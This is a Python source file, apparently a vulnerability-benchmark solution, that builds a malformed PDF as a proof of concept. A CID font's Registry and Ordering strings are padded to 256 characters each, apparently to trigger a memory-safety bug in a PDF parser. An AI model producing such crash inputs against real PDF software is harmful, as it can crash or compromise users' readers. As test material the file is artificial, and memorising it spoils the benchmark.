class Solution:
    def solve(self, src_path: str) -> bytes:
        registry_len = 256
        ordering_len = 256
        registry_str = 'A' * registry_len
        ordering_str = 'B' * ordering_len
        cid_sys = f"<< /Registry ({registry_str}) /Ordering ({ordering_str}) /Supplement 0 >>"

        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n"

        obj2_str = """2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 /Resources << /Font << /F1 4 0 R >> >> >>
endobj

"""
        obj2 = obj2_str.encode('utf-8')

        obj3_str = """3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj

"""
        obj3 = obj3_str.encode('utf-8')

        obj4_str = """4 0 obj
<< /Type /Font /Subtype /Type0 /BaseFont /TestCID /DescendantFonts [6 0 R] /Encoding /Identity-H >>
endobj

"""
        obj4 = obj4_str.encode('utf-8')

        content_text = b"BT /F1 12 Tf 100 700 Td <01> Tj ET"
        content_length = len(content_text)
        obj5_str = f"""5 0 obj
<< /Length {content_length} >>
stream
""" + content_text.decode('ascii') + """
endstream
endobj

"""
        obj5 = obj5_str.encode('utf-8')

        obj6_str = f"""6 0 obj
<< /Type /Font /Subtype /CIDFontType0 /BaseFont /TestCID /CIDSystemInfo {cid_sys} /FontDescriptor 7 0 R /W [ 0 [1000] ] >>
endobj

"""
        obj6 = obj6_str.encode('utf-8')

        obj7_str = """7 0 obj
<< /Type /FontDescriptor /FontName /TestCID /Flags 4 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>
endobj

"""
        obj7 = obj7_str.encode('utf-8')

        body_parts = [b'%PDF-1.7\n']
        offsets = [None] * 8
        current_offset = len(body_parts[0])
        offsets[1] = current_offset
        body_parts.append(obj1)
        current_offset += len(obj1)
        offsets[2] = current_offset
        body_parts.append(obj2)
        current_offset += len(obj2)
        offsets[3] = current_offset
        body_parts.append(obj3)
        current_offset += len(obj3)
        offsets[4] = current_offset
        body_parts.append(obj4)
        current_offset += len(obj4)
        offsets[5] = current_offset
        body_parts.append(obj5)
        current_offset += len(obj5)
        offsets[6] = current_offset
        body_parts.append(obj6)
        current_offset += len(obj6)
        offsets[7] = current_offset
        body_parts.append(obj7)
        body = b''.join(body_parts)
        xref_offset = len(body)
        xref_str = b'xref\n0 8\n'
        xref_str += b'0000000000 65535 f \n'
        for i in range(1, 8):
            off = offsets[i]
            xref_str += f'{off:010d}'.encode('ascii') + b' 00000 n \n'
        trailer = b'trailer\n<< /Size 8 /Root 1 0 R >>\nstartxref\n' + str(xref_offset).encode('ascii') + b'\n%%EOF\n'
        poc = body + xref_str + trailer
        return poc
